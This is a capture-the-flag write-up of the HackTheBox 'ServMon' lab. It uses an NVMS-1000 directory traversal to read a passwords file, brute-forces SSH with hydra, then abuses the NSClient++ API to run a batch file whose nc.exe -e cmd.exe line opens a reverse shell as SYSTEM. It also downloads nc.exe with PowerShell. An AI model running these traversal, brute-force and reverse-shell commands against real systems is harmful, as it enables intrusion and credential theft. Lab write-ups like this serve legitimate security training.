---
layout: post
title: "HackTheBox - ServMon"
author: "joona"
---

![](/images/servmon/sermon.jpg)
ServMon is an easy Windows box where the initial access is achieved with help of a directory traversal
vulnerability and the privilege escalation to NT AUTHORITY\SYSTEM requires exploiting a service monitoring
agent called NSClient++. The privilege escalation proof of concept gave me some pain, but I
managed to figure it out in the end. Fun box!

<br/>
### Nmap results
{% highlight plaintext %}
# Nmap 7.80 scan initiated Sun Apr 12 13:28:28 2020 as: nmap -p- -A -T4 -oA nmap/servmon 10.10.10.184
Nmap scan report for 10.10.10.184
Host is up (0.049s latency).
Not shown: 65517 closed ports
PORT      STATE SERVICE       VERSION
21/tcp    open  ftp           Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_01-18-20  12:05PM       <DIR>          Users
| ftp-syst:
|_  SYST: Windows_NT
22/tcp    open  ssh           OpenSSH for_Windows_7.7 (protocol 2.0)
| ssh-hostkey:
|   2048 b9:89:04:ae:b6:26:07:3f:61:89:75:cf:10:29:28:83 (RSA)
|   256 71:4e:6c:c0:d3:6e:57:4f:06:b8:95:3d:c7:75:57:53 (ECDSA)
|_  256 15:38:bd:75:06:71:67:7a:01:17:9c:5c:ed:4c:de:0e (ED25519)
80/tcp    open  http
| fingerprint-strings:
|   GetRequest, HTTPOptions, RTSPRequest:
|     HTTP/1.1 200 OK
|     Content-type: text/html
|     Content-Length: 340
|     Connection: close
|     AuthInfo:
|     <!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
|     <html xmlns="http://www.w3.org/1999/xhtml">
|     <head>
|     <title></title>
|     <script type="text/javascript">
|     window.location.href = "Pages/login.htm";
|     </script>
|     </head>
|     <body>
|     </body>
|     </html>
|   NULL:
|     HTTP/1.1 408 Request Timeout
|     Content-type: text/html
|     Content-Length: 0
|     Connection: close
|_    AuthInfo:
|_http-title: Site doesn't have a title (text/html).
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
5040/tcp  open  unknown
5666/tcp  open  tcpwrapped
6063/tcp  open  x11?
6699/tcp  open  napster?
7680/tcp  open  pando-pub?
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49669/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
{% endhighlight %}

<br/>
### FTP enumeration
Like the nmap scan says, the FTP server allows anonymous login.<br/>
There we have two files: `Confidential.txt` and `Notes to do.txt`.<br/>

Confidential.txt:
{% highlight plaintext %}
Nathan,
I left your Passwords.txt file on your Desktop.  
Please remove this once you have edited it yourself and place it back into the secure folder.
Regards
Nadine
{% endhighlight %}

Notes to do.txt:
{% highlight plaintext %}
1) Change the password for NVMS - Complete
2) Lock down the NSClient Access - Complete
3) Upload the passwords
4) Remove public access to NVMS
5) Place the secret files in SharePoint
{% endhighlight %}

So we have two usernames, Nathan and Nadine. We also now know that Nathan has a Passwords.txt file on his Desktop folder.
The path for this is most likely C:\Users\Nathan\Desktop\Passwords.txt.

<br/>
### Website enumeration
On port 80 we are redirected to `http://10.10.10.184/Pages/login.htm` where we have a `NVMS-1000` login page.
Using `searchsploit nvms` we see that NVMS-1000 is vulnerable to a [directory traversal](https://packetstormsecurity.com/files/155663/NVMS-1000-Directory-Traversal.html).

The proof of concept for this shows directory traversal is possible with the following payload:
{% highlight plaintext %}
GET /../../../../../../../../../../../../windows/win.ini HTTP/1.1
{% endhighlight %}

Let's intercept the HTTP request with Burp Suite by refreshing the NVMS-1000 login page and change
the GET request to:
{% highlight plaintext %}
GET /Pages/login.htm/../../../../../../../../../../../../../Users/Nathan/Desktop/Passwords.txt HTTP/1.1
{% endhighlight %}
![](/images/servmon/directory_traversal.jpg)

With this we get a list of passwords. I saved these to a file called pass.txt and started brute forcing.<br/>
Brute forcing the FTP server did not give any results, but the SSH matched a password to user Nadine:
{% highlight plaintext %}
hydra -L users.txt -P pass.txt ssh://10.10.10.184
{% endhighlight %}
![](/images/servmon/ssh_hydra.jpg)

<br/>
### Privilege Escalation
Logging in as Nadine via SSH and enumerating the host I found a program called `NSClient++`.<br/>
Inside the NSClient++ install folder we have file `nsclient.ini` which has a password and states
that only allowed hosts are the localhost.

![](/images/servmon/nsclientini.jpg)

Looking at the open ports with `netstat -ano` I saw port `8443` was listening on the localhost.<br/>
This port was not detected by the nmap scan.<br/>

I decided to create a reverse SSH tunnel to see what is the deal with this port:<br/>
{% highlight plaintext %}
ssh -L 8443:127.0.0.1:8443 nadine@10.10.10.184
{% endhighlight %}
`-L` = create a local SSH tunnel<br/>
`8443` = the port we want to use on our machine (can be any port)<br/>
`127.0.0.1:8443` = connect to port 8443 on the local machine (target machine)<br/>
`nadine@10.10.10.184` = establish the tunnel as user Nadine<br/>

Now we can open the site on our machine: `https://127.0.0.1:8443`<br/>
![](/images/servmon/nsclient.jpg)

I used the password found in `nsclient.ini` file to log in. After this my goal was to
find the version of the install NSClient++. The web interface did not leak this, so
I took a look inside the install folder where there was `changelog.txt` with last update in
early 2018. This meant we probably are dealing with an old ass version, which more than likely
is vulnerable to something.<br/>

Researching this I found a [privilege escalation from 2019](https://www.exploit-db.com/exploits/46802).
The PoC has you doing all kind of funky stuff on the web interface scheduling external scripts and what not.<br/>
I had no success replicating this via the GUI, so I decided to take a different route.<br/>

Digging through the [NSClient++ documentation](https://docs.nsclient.org/api/rest/scripts/), we see that we can do this with the API.
We can list the available scripts:
{% highlight plaintext %}
curl -s -k -u admin https://localhost:8443/api/v1/scripts/ext?all=true | python -m json.tool
{% endhighlight %}

I created a simple .bat-file reverse shell script that I would upload and run.<br/>
ebin.bat:
{% highlight plaintext %}
@echo off
C:\Temp\nc.exe 10.10.14.16 8808 -e cmd.exe
{% endhighlight %}

<br/>
For this we need to upload a `nc.exe` binary to the target host.<br/>
Kali most likely has nc.exe on there by default (`locate -i nc.exe`), but you can also download it for example from [packetstormsecurity](https://packetstormsecurity.com/files/31140/nc.exe.html).<br/>

Navigate to C:\Temp folder on the target host and download the file:
{% highlight plaintext %}
powershell "(new-object System.Net.WebClient).Downloadfile('http://10.10.14.31:8000/nc.exe', 'nc.exe')"
{% endhighlight %}

<br/>
Back on our machine, upload the script to NSClient++ and setup a listener to catch that reverse shell:
{% highlight plaintext %}
curl -s -k -u admin -X PUT https://localhost:8443/api/v1/scripts/ext/scripts/ebin.bat --data-binary @ebin.bat
nc -lvnp 8808
{% endhighlight %}

Now we can go to the web GUI console (`https://127.0.0.1:8443/index.html#/console`) and run the script by
just typing `ebin` and pressing Run.

We get a reverse shell as NT AUTHORITY\SYSTEM on our port 8808 listener. <br/>
Rooted :)

Don't forget to remove the script.
{% highlight plaintext %}
# Delete the definition of the script:
curl -s -k -u admin -X DELETE https://localhost:8443/api/v1/scripts/ext/ebin
# Remove the script
curl -s -k -u admin -X DELETE https://localhost:8443/api/v1/scripts/ext/scripts/ebin.bat
{% endhighlight %}

Thank you for reading!
